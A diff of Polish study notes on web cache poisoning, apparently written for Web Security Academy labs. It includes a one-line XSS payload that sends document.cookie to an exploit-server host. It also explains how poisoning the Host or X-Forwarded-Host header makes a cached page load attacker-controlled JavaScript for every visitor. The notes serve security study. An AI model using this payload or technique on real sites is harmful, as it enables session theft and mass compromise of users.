@@ -14,10 +14,16 @@ new Image() — klasyczny wektor, działa nawet jeśli CSP blokuje fetch/XHR ale
 new Image().src='https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie
 
 
-++++++++++++++++++++
+<hr>
 
 Obserwacja: Co atakujesz <br>
 Payload (z-foprwarded-host: exploit server) z nagłówka pojawia się wprost w body /	- atakuje /<br>
 Payload (z-foprwarded-host: exploit server) z naglowka zmienia tylko Location/redirect na payload,	Zasób importowany przez / (np. tracking.js)  - atakuje tracking.js<br>
 Kombinacja 2+ nagłówków potrzebna do efektu (osobno nic nie robią)	Zwykle wskazuje na zasób pomocniczy - atakuje tracking.js<br>
+
+<hr>
+
+Karol Cz.: Strona ładuje pliki javscript pobierajac je z pelnego url z hostem, a ty zatruwasz hosta naglowkiem host, x-forwarded-host albo cokolwiek innego i strona zaczyna po prostu ładować wszystko z twojego hosta
+
+❤️ Jak zacacheuje (masz cache hit) to globalnie to sie stanie I kazdy dostanie kontent z twojego serwera
 
